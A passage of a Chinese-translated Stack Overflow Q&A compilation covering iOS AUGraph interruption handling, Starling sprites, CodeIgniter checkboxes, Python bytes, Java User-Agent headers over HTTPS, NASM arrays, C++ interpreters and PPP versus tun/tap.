                                           object: [AVAudioSession sharedInstance]]; 
```

当发生中断时，将调用 handleInterruption 方法：

```
// If the system interrupts the audio session - kill the volume
-(void) handleInterruption: (NSNotification *) notification {
    NSDictionary *interuptionDict = notification.userInfo;
    NSInteger interuptionType = [[interuptionDict valueForKey:AVAudioSessionInterruptionTypeKey] intValue];

    if (interuptionType == AVAudioSessionInterruptionTypeBegan) {
        [self setAudioSessionActive: NO];
        [self stopAUGraph];
    }
    else if (interuptionType == AVAudioSessionInterruptionTypeEnded) {
        [self setAudioSessionActive: YES];
        [self startAUGraph];
    }
} 
```

以下是启动和停止 AUGraph 的方法

```
-(void) startAUGraph {
    CheckError(AUGraphStart(_audioGraph), "Failed to start Audio Graph");
}

-(void) stopAUGraph {
    Boolean isRunning = false;

    // Check to see if the graph is running.
    CheckError(AUGraphIsRunning(_audioGraph, &isRunning), "Error trying querying whether graph is running");
    // If the graph is running, stop it.
    if (isRunning) {
        CheckError(AUGraphStop(_audioGraph), "Failed to stop Audio Graph");
    }
} 
```

这是 setAudioSessionActive 方法：

```
-(void) setAudioSessionActive: (BOOL) active {
    NSError *audioSessionError = nil;
    BOOL success = [_audioSession setActive:active error:&audioSessionError];
    if (!success) {
        NSLog (@"Error activating audio session!");
    }
} 
```

我在渲染回调中设置了一个断点，因此我可以确认 AUGraph 没有运行。有没有人遇到过这个问题？我还需要做些什么才能让 AUGraph 再次运行吗？提前致谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-10-20T18:24:50.317

我也遇到了这个错误的可怕麻烦。我想我找到了解决方法：

由于调用中断后返回时 NSNotifications 不会触发，因此在我的 AppDelegate 的`-applicationWillEnterForeground:`方法中，我检查是否存在导致其进入后台的中断（我在`AVAudioSessionInterruptionNotification`发布时设置了一个标志`AVAudioSessionInterruptionTypeBegan`作为中断类型键) 如果是这样，我在控制 AUGraph 的对象中调用一个方法，该方法运行以下内容：

```
 Boolean isRun = FALSE;
    AUGraphIsRunning(myAUGraph, &isRun);
    if (isRun) {
        NSLog(@"END INTERRUPTION BUT AUGRAPH IS RUNNING");
        AUGraphStop(myAUGraph);// Kick start the AUGraph!
        AUGraphStart(myAUGraph); //Restart immediately
        Boolean isInit = FALSE;
        AUGraphIsInitialized(processingGraph, &isInit);
        if (!isInit) {
            NSLog(@"augraph not initd'");
            OSStatus result = AUGraphInitialize(processingGraph);
            if (result != noErr) {
                NSLog(@">>can't init graph");
            }
        }
    }
    else
    {
        NSLog(@"END INTERRUPTION BUT AUGRAPH IS NOT RUNNING");
    } 
```

关键似乎是停止然后立即重新启动 AUGraph。到目前为止，当有来电或另一个应用程序接管扬声器/麦克风时，它可以正常运行，我可以从我在应用程序中中断的地方接听。

AUGraph 的重新初始化似乎从未执行过，也没有执行`isRun`过，`TRUE`但无论如何我都将其保留了。希望对您的情况有所帮助，我花了几天的时间来破解这个问题，我希望它继续有效，而不仅仅是巧合！4 小时，到此为止！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-11-04T10:24:37.950

in iOS 7, it works for me.

```
//Interruption handler
-(void) interruption: (NSNotification*) aNotification
{

    NSDictionary *interuptionDict = aNotification.userInfo;

    NSNumber* interuptionType = (NSNumber*)[interuptionDict valueForKey:AVAudioSessionInterruptionTypeKey];

    if([interuptionType intValue] == AVAudioSessionInterruptionTypeBegan)

        [self stopAUGraph];

    else if ([interuptionType intValue] == AVAudioSessionInterruptionTypeEnded)

        [self startAUGraph];

} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-05-14T07:26:15.920

我不确定您是否能够使用当前的 iOS6 版本实现这一目标。请参阅此错误报告 - [http://openradar.appspot.com/12412685](http://openradar.appspot.com/12412685)

您可能希望收听**UIApplicationWillResignActiveNotification**和**UIApplicationDidBecomeActiveNotification**通知，这些通知在中断期间触发，例如电话呼叫和通知处理程序中的停止/启动音频会话。

# arrays - 如何停止在八哥中渲染屏幕精灵？

> ID：15845065
> 
> 赞同：0
> 
> 时间：2013-04-05T23:10:06.640
> 
> 标签：arrays, optimization, flash-builder, sprite, starling-framework

我在删除我的敌人时遇到了麻烦，因为他们在八哥中离开了屏幕。一段时间后我遇到了性能问题，因为我的敌人数组一直在增长。

这是我在课程结束时制造敌人的代码以及更新功能。

```
private function makeEnemies():void
    {
        enemySpawnCounter++;

        if (enemySpawnCounter > enemySpawnDelay)
        {
            enemySpawnCounter = 0;
            enemySpawnDelay -= difficultyRate;
            difficulty += difficultyRate;
            makeEnemy();
        }
    }

    private function makeEnemy():void
    {
        var i:int;
        for (i = 0; i < Math.floor(difficulty); i++)
        {
            var newEnemy:Enemy = new SnowBall();

            newEnemy.x = 925;
            newEnemy.y = Math.random() * 375 + 50;
            //trace(newEnemy.x); trace(newEnemy.y);
            newEnemy.xVel = (-Math.random() * difficulty) - 5;
            newEnemy.sinMeter = Math.random() * 10;
            newEnemy.bobValue = Math.random() * difficulty;

            enemiesLayer.addChild(newEnemy);
            enemies.push(newEnemy);

            if (newEnemy.x <= 0)
            {
                enemies.splice(i, 1);
                enemiesLayer.removeChild(newEnemy);
            }
        }
    }
private function update():void
    {
        trace(enemies.length, lasers.length);

        for each (var enemy:Enemy in enemies)
        {
            enemy.update();
        }

        for each (var laser:Laser in lasers)
        {
            laser.update();
            newHitTest(laser);
        }

        makeEnemies();
    } 
```

这是我的敌人班级...

```
package objects
{
import starling.events.Event;
import starling.display.Sprite;
import objects.Laser;

public class Enemy extends Sprite
{
    public static const PURGE_EVENT:String = "ENEMY_PURGE";

    public var sinMeter:Number;
    public var bobValue:Number;
    public var status:String;

    public var xVel:Number;
    public var yVel:Number;

    public function Enemy()
    {
        status = "OK";
        bobValue = 0.1;
        sinMeter = 0;
        xVel = 0;
        yVel = 0;
    }

    public function destroy():void
    {
        status = "Dead";
        visible = false;
    }

    public function update():void
    {
        x += xVel;
        y += yVel;

        if (x < 0)
        {
            trace("Dispatching Enemy Escaped!");
            dispatchEvent(new Event(Laser.PURGE_EVENT, true, false));
        }
    }
}
} 
```

有人知道如何解决这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T17:02:52.277

检测他们是否正在触摸屏幕，我从未使用过八哥，但我认为可能会有某种碰撞检测，所以制作一个与屏幕保持一致的屏幕大小的矩形或表面，然后只绘制敌人正在与那个表面相撞。

# php - 需要帮助创建可编辑的复选框

> ID：15845073
> 
> 赞同：3
> 
> 时间：2013-04-05T23:11:14.213
> 
> 标签：php, mysql, codeigniter

我试图创建一个编辑页面，其中包含一些复选框，其中的值是从数据库中循环的。我尝试了不同的代码组合，但是我似乎在使其正常工作方面遇到了问题，尤其是复选框（复选框是我唯一遇到问题的一个）。

我的代码会发生什么...

例如，如果所有复选框都被选中并且我取消选中第二个和第三个

```
 ✓ Dj Lorem        ■ Dj Ipsum
 ■ Dj Dolor        ✓ Dj Sit
 ✓ Dj Amet 
```

提交后会是这个样子

```
 ✓ Dj Lorem        ✓ Dj Ipsum
 ✓ Dj Dolor        ■ Dj Sit
 ■ Dj Amet 
```

选中的内容上升/最后一个复选框始终是未选中的复选框，依此类推（如果您取消选中 2 个复选框，则最后 2 个复选框是未选中的复选框）

**edit_news.php（查看）**

```
Edit News
<?php
    $id = $news_id;
    $attributes = array('class' => 'form form-horizontal','id'=>'form_news','name'=>'form_news');
    echo form_open(base_url() . 'cms/update_news/'.$id, $attributes);
?> 

News Title: <input type="text" class="w300" name="news_title" id="news_title" value="<?php echo $news1->news_title; ?>">
<?php
        $i=0;
        foreach($dj->result() as $d)
        {
            $q = $cdj->row($i);
        ?>
          <div class="span3">
              <label class="checkbox">
                <input type="checkbox" name="cats[]" value="<?php echo $d->UID; ?>"<?php if($q->checked=="yes"){echo "checked";}else if($q->checked==""){};?> /> DJ <?php echo $d->dj_name;?>
                <input type="hidden" name="dj_id[]" value="<?php echo $d->UID; ?>">
              </label>

                </div>
                <?php
                $i=$i+1;
            }
        ?>
 <input type="submit" class="btn btn-primary pull-right" value="Save">
 </form> 
```

视图 php 看起来像这样

```
 Edit News

 News Title: ___Party at 6____ 
 Choose a DJ
 ■ Dj Lorem        ■ Dj Ipsum
 ■ Dj Dolor        ■ Dj Sit
 ■ Dj Amet 
```

**cms.php（控制器）**

```
public function news_edit($id)
{
    $data['dj'] = $this->cms_model->get_dj();
    $data['news1'] = $this->cms_model->get_one_news($id);
    $data['djnews'] = $this->cms_model->get_djnews($id);
    $data['cdj'] = $this->cms_model->get_cdj($id);
    $data['id'] = $id;
    $this->load->vars($data);
    $this->load->view('admin/news_edit');
}

public function update_news($id)
{
    $this->cms_model->update_news($id);
    redirect(base_url() . "cms/news_edit/".$id);
} 
```

**cms_model.php(模型)**

```
function get_dj(){
    return $this->db->select()->from("roster")->get();
}

function get_one_news($id){
    return $this->db->select()->from("news")->where("UID",$id)->get()->row();
}

function get_cdj($id){
        return $this->db->select()->from("news_dj")->where("news_id",$id)->get();   
}

function update_news($id)
{       
    $news_title = $this->input->post("news_title");

    $cats = $this->input->post("cats");
    $dj_id = $this->input->post("dj_id");

    $newdata = array('news_title'=>$news_title
                    );

    $this->db->where('UID', $id);
    $this->db->update('news', $newdata);

    $i=0;
    foreach($dj_id as $d)
    {
        if ($cats[$i] == ""){$check="no";}
        else{$check="yes";}
        $dj = array('dj_id'=>$d,'news_id'=>$id,'checked'=>$check);
        $this->db->where('dj_id', $d);
        $this->db->where('news_id', $id);
        $this->db->update('news_dj', $dj); 
        $i=$i+1;
    }
} 
```

**新闻(sql)**

```
 UID       news_title
  6        Party at 6
  7        Event Cancelled on Monday
  8        and so on 
```

**名册（sql）**

```
 UID       news_title
  1        Lorem
  2        Ipsum
  3        Dolor
  4        Sit
  5        Amet 
```

**news_dj(sql)**

```
 dj_id     news_id    checked
  1        6          yes
  2        6          yes
  3        6          yes
  4        6          no
  5        6          no 
```

我已经没有想法了，我似乎无法解决它

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T23:24:23.123

你把它设置得很奇怪。`cats[]`将*仅*包含已检查的元素，因此检查 if`$cats[$i] != ""`意味着它将计算已检查的数量，并且在您的循环中，将分配`x`列出的第一批 DJ。在设置 HTML 时，我建议

```
name="cats[<?php echo $d->UID; ?>]" value=... 
```

这样，它就会按照您在更新循环中所期望的方式进行索引。这将是解决您的问题的最简单方法 - 否则，您可以检查在更新中对照 DJ id 检查的值。但是，我再次选择解释如何使其以最快的速度为您所拥有的工作^^

**编辑**

如果您不想更改您的 HTML，您可以从以下位置更改您的支票：

```
if ($cats[$i] == ""){$check="no";}
        else{$check="yes";} 
```

到：

```
$check = (in_array($d, $cats)) ? "yes" : "no"; 
```

因为这将查看当前 DJ 是否在提交的复选框值列表中。

# python - 在 Python3 中，当我读取二进制文件时，为什么 'b' 会添加到我的内容中？

> ID：15845074
> 
> 赞同：1
> 
> 时间：2013-04-05T23:11:20.553
> 
> 标签：python

例如，我正在尝试按如下方式读取文件

```
fd = open('mydb.dbf', 'rb')
print(fd.read(1)) 
```

输出是：

> b'\x03'

我只希望'\x03'。额外的字符来自哪里？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-05T23:15:16.013

没有多余的字符。您有一个`bytes`对象，其内容是单字节`\x03`。

该`print`函数打印`str`任何对象的表示。一个`bytes`对象打印为`b'\x03'`. 但这`b`与引号一样（或者，就此而言，反斜杠、x 或两位数）不再是值的一部分。

要让自己相信这一事实，请尝试`print(len(my_bytes))`或`print(my_bytes[0])`。长度为`1`; 第一个值是（字节）数字`3`。

（如果您不想要`bytes`对象，则不应该以二进制模式打开文件。但是，考虑到第一个字符是 control-C，您可能*确实*想要`bytes`对象。）

# java - 在 https 连接标头中设置用户代理属性

> ID：15845075
> 
> 赞同：12
> 
> 时间：2013-04-05T23:11:24.433
> 
> 标签：java, https, http-headers

我无法正确设置`user-agent`https 连接的属性。根据我收集到的信息，http-header 属性可以通过`-Dhttp.agent`VM 选项或通过[`URLConnection.setRequestProperty()`](http://docs.oracle.com/javase/6/docs/api/java/net/URLConnection.html#setRequestProperty%28java.lang.String,%20java.lang.String%29). 但是，通过 VM 选项设置用户代理会导致将“Java/[version]”附加到 http.agent 的任何值。同时`setRequestProperty()`仅适用于 http 连接，而不适用于 https（至少在我尝试时）。

```
java.net.URL url = new java.net.URL( "https://www.google.com" );
java.net.URLConnection conn = url.openConnection();
conn.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0");
conn.connect();
java.io.BufferedReader serverResponse = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
System.out.println(serverResponse.readLine());
serverResponse.close(); 
```

我通过使用 WireShark 检查 http 通信发现/验证了问题。有没有办法解决？

**更新：添加信息**

看来我对交流的了解不够深入。该代码是从代理后面运行的，因此观察到的通信是针对代理的，通过 设置`-Dhttps.proxyHost`，而不是目标网站 (google.com)。无论如何，在 https 连接期间，方法是`CONNECT`，而不是`GET`。这是 https 通信尝试的wireshark 捕获。就像我上面提到的，用户代理是通过设置的，`-Dhttp.agent`因为`URLConnection.setRequestProperty()`没有效果（用户代理 = Java/1.7.0）。在这种情况下，请注意附加的*Java/1.7.0*。问题仍然是一样的，为什么会发生这种情况，我该如何解决？

```
CONNECT www.google.com:443 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0 Java/1.7.0
Host: www.google.com
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Proxy-Connection: keep-alive

HTTP/1.1 403 Forbidden
X-Bst-Request-Id: MWPwwh:m7d:39175
X-Bst-Info: ch=req,t=1366218861,h=14g,p=4037_7213:1_156,f=PEFilter,r=PEBlockCatchAllRule,c=1905,v=7.8.14771.200 1363881886
Content-Type: text/html; charset=utf-8
Pragma: No-cache
Content-Language: en
Cache-Control: No-cache
Content-Length: 2491 
```

顺便说一句，由于代理过滤用户代理，请求被禁止，*Java/1.7.0*导致拒绝。我已将*Java/1.7.0*附加到 http 连接的用户代理，并且代理也拒绝连接。我希望我不会发疯:)。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-04-16T02:21:36.203

> 我通过使用 WireShark 检查 http 通信发现/验证了问题。有没有办法解决

这是不可能的。加密协议的随意观察完全掩盖了通过 SSL 套接字进行的通信。使用数据包捕获软件，您将能够查看 SSL 连接的启动和加密数据包的交换，但这些数据包的内容只能在连接的另一端（服务器）提取。如果不是这种情况，那么整个 HTTPS 协议就会被*破坏*，因为它的重点是保护 HTTP 通信免受中间人类型的攻击（在这种情况下，MITM 是数据包嗅探器） .

### HTTPS 请求的示例捕获（部分）：

> .n....E............./..5..3..9..2..8........ ...@.......................Ql.{....b....OsR..!.4.$.T. ..-.-.T....Q...M..Ql.{...LM..L...um.M....s. ...n...p^0}..I..G4.HK.n......8Y....E....A.. >...0...0.... ).s........0 ..*.H.. .....0F1.0...U.. ..US1.0...U. . Google Inc1"0 ..U....Google Internet Authority0.. 130327132822Z. 131231155850Z0h1.0...U....US1.0...U...California1.0...U...Mountain View1.0...U. . Google Inc1.0...U....www.google.com0..0

从理论上讲，知道您的`User-Agent`标头是否实际上被排除的唯一方法是您是否可以访问 Google 服务器，但实际上 HTTPS 规范或 Java 的实现中没有任何内容排除通常已发送的标头HTTP。

### HTTP请求的示例捕获：

> GET / HTTP/1.1
> 用户代理：Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0
> 主机：www.google.com
> 接受：text/html, image/gif, image/jpeg, *; q=.2, */* ; q=.2
> 连接：保持活动

两个示例捕获都是使用***完全相同的***代码生成的：

```
URL url = new URL(target);
URLConnection conn = url.openConnection();
conn.setRequestProperty("User-Agent",
        "Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0");
conn.connect();
BufferedReader serverResponse = new BufferedReader(
        new InputStreamReader(conn.getInputStream()));
System.out.println(serverResponse.readLine());
serverResponse.close(); 
```

除了 HTTPS 的目标是“ [https://www.google.com](https://www.google.com) ”，而 HTTP 的目标是“ [http://www.google.com](http://www.google.com) ”。

* * *

## 编辑1：

根据您更新的问题，使用该`-Dhttp.agent`属性***确实***将“Java/version”附加到用户代理标头，如[以下文档](http://download.java.net/jdk7/archive/b123/docs/api/java/net/doc-files/net-properties.html)所述：

> *http.agent*（默认值：“Java/<version>”）
> 定义在 http 请求中的 User-Agent 请求标头中发送的字符串。请注意，字符串“Java/<version>”将附加到属性中提供的字符串（例如，如果使用 -Dhttp.agent=”foobar”，则 User-Agent 标头将包含“foobar Java/1.5.0”如果 VM 的版本是 1.5.0）。此属性仅在启动时检查一次。

“违规”代码位于以下静态块初始化程序中`sun.net.www.protocol.http.HttpURLConnection`：

```
static {
    // ...
    String agent = java.security.AccessController
            .doPrivileged(new sun.security.action.GetPropertyAction(
                    "http.agent"));
    if (agent == null) {
        agent = "Java/" + version;
    } else {
        agent = agent + " Java/" + version;
    }
    userAgent = agent;

    // ...
} 
```

解决这个“问题”的一个淫秽方法是这段代码，我 1000% 建议你***不要***使用它：

```
protected void forceAgentHeader(final String header) throws Exception {
    final Class<?> clazz = Class
            .forName("sun.net.www.protocol.http.HttpURLConnection");

    final Field field = clazz.getField("userAgent");
    field.setAccessible(true);
    Field modifiersField = Field.class.getDeclaredField("modifiers");
    modifiersField.setAccessible(true);
    modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
    field.set(null, header);
} 
```

将此覆盖与`https.proxyHost`,`https.proxyPort`和`http.agent`set 一起使用可得到所需的结果：

> 连接 www.google.com:443 HTTP/1.1
> 用户代理：Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0
> 主机：www.google.com
> 接受：text/html, image/gif,图像/JPEG，*；q=.2, */* ; q=.2
> 代理连接：保持活动

但是，是的，不要那样做。仅使用[Apache HttpComponents](http://hc.apache.org/)更安全：

```
final DefaultHttpClient client = new DefaultHttpClient();
HttpHost proxy = new HttpHost("127.0.0.1", 8888, "http");
HttpHost target = new HttpHost("www.google.com", 443, "https");
client.getParams().setParameter(ConnRoutePNames.DEFAULT_PROXY, proxy);
HttpProtocolParams
        .setUserAgent(client.getParams(),
                "Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0");
final HttpGet get = new HttpGet("/");

HttpResponse response = client.execute(target, get); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-17T16:53:19.830

> 我通过使用 WireShark 检查 http 通信发现/验证了问题。有没有办法解决？

这里没有问题。User-Agent 标头设置请求是否通过 HTTP / HTTPS 传输。甚至将其设置为不合理的东西，例如`blah blah`在 HTTPS 上工作。下面显示的标头是在使用的底层协议为**HTTPS**时捕获的。

# 通过 HTTPS 发送的请求标头

```
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive 
```

* * *

```
User-Agent: blah blah
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive 
```

* * *

这是触发请求的代码。

```
 // localhost:52999 is a reverse proxy to xxx:443
        java.net.URL url = new java.net.URL( "https://localhost:52999/" );
        java.net.URLConnection conn = url.openConnection();
        conn.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0");
        conn.connect();
        java.io.BufferedReader serverResponse = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
        System.out.println(serverResponse.readLine());
        serverResponse.close(); 
```

通常，无法嗅探 HTTPS 请求（如提到的@Perception）。通过将根 CA 替换为自己的假 CA 的代理来传递请求，您可以看到流量。更简单的方法是只看目标服务器的访问日志。但是从上面的 HTTPS 请求片段可以看出，`User-Agent`发送的标头是正确的。

# ruby-on-rails - rails client_side_validations 并选择标签

> ID：15845078
> 
> 赞同：4
> 
> 时间：2013-04-05T23:11:47.957
> 
> 标签：ruby-on-rails, ruby, client-side-validation

gem client_side_validations 不会验证未选择项目的选择标签。也许需要在模型或 .erb 文件中传递一些参数？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-16T13:31:27.300

解决方案是尝试验证存在。尝试验证**数值 / 大于 > 0**。

# java - 如何编写HashMap迭代器？

> ID：15845079
> 
> 赞同：0
> 
> 时间：2013-04-05T23:12:05.540
> 
> 标签：java, iterator, hashmap

当我使用 Iterator it = denseBagMap.keySet().iterator() 时，即使它包含不止一次，它也只会返回一个键。但我希望能够返回一个元素，假设“a”出现 3 次。下一个方法应该能够返回“a”三次，但我不确定我该怎么做。我在这方面有点慢，但如果有人可以向我展示带有实际代码的迭代器，那将会很有帮助。迭代器只需要 hasNext() 和 next() 方法。

```
public class DenseBag<T> extends AbstractCollection<T> {

private Map<T, Integer> denseBagMap;
private int size;  // Total number of elements in the bag
/**
 * Initialize a new, empty DenseBag
 */
public DenseBag() {
    denseBagMap = new HashMap<T, Integer>();

};
    public boolean equals(Object o) {
    if (o == this) {
        return true;
    }
    if (!(o instanceof DenseBag)) {
        return false;
    }
    DenseBag<T> dense = (DenseBag<T>) o;
    return size == dense.size;

}
    public int hashCode() {
    return this.denseBagMap.hashCode();

}
    //I am not sure how to write an iterator method for this.
    public Iterator<T> iterator() {
    return new Iterator<T>() {

  public boolean hasNext(){
 }

  public T next(){
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T23:22:50.197

`keySet`根据定义，A是 a `Set`，因此**每个 key 只包含一个条目**。如果您希望存储在每个键下添加的所有条目，您应该使用[Apache MultiMap](http://commons.apache.org/proper/commons-collections/apidocs/org/apache/commons/collections/MultiMap.html)之类的东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T23:23:29.423

放在那里 return new denseBagMap.keySet().iterator();

# image - 图像在 FF 和 Chrome 中垂直显示而不是水平显示

> ID：15845080
> 
> 赞同：1
> 
> 时间：2013-04-05T23:12:22.200
> 
> 标签：image, firefox, css-float, vertical-alignment, alignment

我希望有一个人可以帮助我！我的图像在 FF 和 Chrome 中垂直显示而不是水平显示，但在 IE 中完美（水平）显示。我对html有点了解，对css属性知之甚少，所以我正忙着解决这个问题。经过几个月的论坛搜索，我得出的结论是，我遇到的问题与“宽度”属性、我添加到网站的 jquery 手风琴菜单或两者有关。在我为手风琴菜单插入 html 和 css 后，问题就开始了。您可以在此处查看示例（使用 FF 或 Chrome 浏览器）：[Spring Creek Rustic Outfitters](http://stores.homestead.com/springcreekrusticoutfitters/-strse-214/Rustic-Natural-Cedar-Arched/Detail.bok)

相关代码的 HTML 部分：

```
<table border="0" cellspacing="0" cellpadding="0">
<tr>
    <td valign="top">
    <ss:if test="$product.defaultImage"> 
        <table border="0" cellspacing="0" cellpadding="0" id="imgtable" rules="none">
            <tr>
                <td valign="middle" align="center" width="100%" height="100%" id="divMediumContainer">
                    <ss:set name="item" value="$product.defaultImage"/>

                    <ss:if test="$item.hasMediumSize()">
                            <ss:set name="urlMedium" value="$item.medium"/>
                    <ss:else/>
                            <ss:set name="urlMedium" value="$item.small"/>
                    </ss:if>

                    <ss:image id="imgMedium" source="$urlMedium" title="$item.title" class="click"/>         
                </td>
            </tr>
        </table>

        <br />

        <ss:foreach item="productMedia" within="$product.images">
            <ss:if test="$counter.totalRows > 1">
                <ss:set name="item" value="$productMedia.storeMediaItem"/>
                <ss:if test="$item.hasSmallSize()">
                    <div style="padding:2px 2px 2px 2px"><div id="$system.concat('divSmallImage_', $counter.currentRow)" class="imagesmallcontainer">
                        <ss:image id="$system.concat('imgSmall_', $counter.currentRow)" source="$item.getImage('small')" calcoffset="65"/>
                    </div></div>
                    <ss:if test="$counter.isLast">
                        <div class="hoverover">
                            <ss:image source="$storeVersion.images['hoverOver.gif']"/>
                        </div>  
                    </ss:if>
                </ss:if>
            </ss:if>
        </ss:foreach>
    <ss:else/>
        <div class="notavailable">
            <div style="padding:50px">Photo Not Available</div>
        </div>
    </ss:if>
</td> 
```

代码的CSS部分：

```
/****** MULTIPLE IMAGES ****** product detail page */
.click {cursor:pointer}
.imagesmallcontainer {
    background-color:#ffffff;
border:2px solid #CCCCCC;
display:inline-block;
height:65px;
margin:4px 4px 2px 0px;
overflow:hidden;
width:65px;
    position: relative;
}
.hoverover {
display:inline-block;
font-size:11px;
padding-bottom:2px;
padding-top:2px;
    position: relative;
}
.notavailable {
background-color:#ffffff;
border:1px solid #cccccc;
color:#666666;
padding:10px;
text-align:center;
} 
```

由于我使用的是来自网络主机的模板，我不确定是否有人可以提供帮助……但我认为值得一试。

提前致谢， 玛西

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T21:05:26.060

用于`Float:left`.imagesmallcontainer元素或其中的**img****标签**。它会起作用的。

# arrays - 数组表达式语法错误

> ID：15845081
> 
> 赞同：0
> 
> 时间：2013-04-05T23:12:29.840
> 
> 标签：arrays, syntax, compiler-errors, x86, nasm

我正在尝试创建一个包含 5 个数据字符串的数组，每个字符串由 3 个 0 和一个小写字母组成。当我去编译我的代码时，它给了我一个错误，说表达式语法错误。我在这里缺少什么吗？代码中的行完全如下

段.data

my_data db 000a, 000c, 000e, 000f, 000g ;由于用作二进制和十进制表示法而跳过 b,d

段 .text

代码

编辑*我曾尝试使用 db、dd、dw、dq 来说明大小，但没有一个有效。我试着记下数组中元素的数量。*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T02:43:45.293

字符串在引号之间定义。下面是一个包含 7 个字符串的数组，包括“b”和“d”

```
my_data db "000a", "000b", "000c", "000d", "000e", "000f", "000g" 
```

# c++ - C ++中的现代解释器代码？

> ID：15845082
> 
> 赞同：3
> 
> 时间：2013-04-05T23:12:37.540
> 
> 标签：c++, parsing, interpreter, lexer

我正在寻找用 C++ 编写的简单解释器代码。理想情况下，它不会比具有变量赋值的表达式求值器更复杂（用于内存管理代码）。

我的理由是，我正在研究现代编译器设计，目标是能够为 V8 javascript 引擎等解释性语言引擎做出贡献。然而，到目前为止，这本书的所有代码都是用 C 编写的，我希望看到在这种情况下为 C++ 实现的设计实践，尤其是内存管理模型，以及一般的词法分析器/解析器/等的结构。

我知道没有多少代码是这样基本的，而且 C++ 不是编写解释器的传统语言（尤其是在开源世界），但我希望有人在这方面工作过并且至少可以将我指向他们的个人 Git 存储库。

我一直在寻找这种代码大约一个星期，但我能找到的唯一代码太复杂了，在这个阶段我无法理解。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T23:48:02.820

# C++ 编程语言

> 我正在寻找用 C++ 编写的简单解释器代码。理想情况下，它不会比具有变量赋值的表达式求值器更复杂（用于内存管理代码）。

你读过[C++ 编程语言](http://en.wikipedia.org/wiki/The_C%2B%2B_Programming_Language)吗？

[在第 6 章，它有一个简单递归下降解析器](http://en.wikipedia.org/wiki/Recursive_descent_parser)的好例子。是的，它是带有变量赋值的表达式求值器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T08:32:12.547

[LLVM Kaleidoscope](http://llvm.org/docs/tutorial/)教程包含您需要的许多基础知识：地道的 C++ 语言词法分析和解析、中间表示处理等。

或者，如果您正在寻求真正的核心 C++ 体验，您可能想看看[Boost::Spirit](http://boost-spirit.com/home/)，这里有很多示例，从简单的表达式求值器到复杂的语法。

# linux - /dev/ppp 和 /dev/net/tun 有什么区别？

> ID：15845087
> 
> 赞同：7
> 
> 时间：2013-04-05T23:13:13.530
> 
> 标签：linux, ppp, tun

PPP和tun/tap有什么区别？两者似乎都是为了通过用户空间程序实现网络。

使用 PPP，内核创建 ppp%d 以供使用，并让用户空间程序为其提供后端。
使用 tun/tap，内核创建 tun%d 以供使用，并让用户空间程序为其提供后端...

~~将程序从使用 tun/tap （在我的 Android 设备上似乎不可用）~~更改为 ppp有多困难？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-04-06T23:22:47.440

它们都提供某种形式的网络访问，为什么有两种不同的东西似乎做同样的事情？答案是他们不会做同样的事情。

点对点协议 ( `ppp`) 旨在通过串行链路提供 IP 网络连接。提供串行链接的最常见的东西是调制解调器，这些存在于手机中，并且在几年前当您拨打服务提供商连接到互联网时无处不在。您的`ppp`连接从您的 PC 连接到接收器，接收器将串行信号转换回通过互联网路由的 IP 数据包。

如今，当您从服务提供商处获得电缆调制解调器或 ADSL 调制解调器时，它会通过以太网或 WiFi 链接提供 IP 网络连接。调制解调器实际上是在为您的服务提供商提供连接，这可以看作与`ppp`连接相同；只是您的计算机不再进行从 IP 数据包到通过 ADSL 线路或电缆连接的信号的转换工作。单独的调制解调器提供了一层远离与提供商交谈的复杂性，您只是在谈论“简单”的以太网/WiFi。

Tun/Tap 机制允许您访问位于`vpn`标准网络连接之上一层的虚拟专用网络 ( )；因此，例如，如果您通过以太网连接到电缆调制解调器，那么这就是通过以太网连接提供对 vpn 的访问。如果您通过直接插入您的 PC 的调制解调器访问互联网，那么您将访问您的 vpn over `ppp`。就其本身而言，tun/tap 接口不提供互联网访问，它依赖于预先存在的连接。这是网络分层的一个例子。

询问将程序从使用 tun/tap 网络连接转换为使用 ppp 连接有多困难会误解这两个接口在提供网络访问时的位置 - tun/tap 将位于 ppp 之上。未加密的数据包进入 tun/tap 接口，被加密，然后作为 IP 数据包发送到 ppp 接口，该接口将它们转换为串行信号发送到远程端，将它们转换回 IP 数据包并将它们转发到`vpn`目标解密它们并通过它自己的专用网络路由它们。

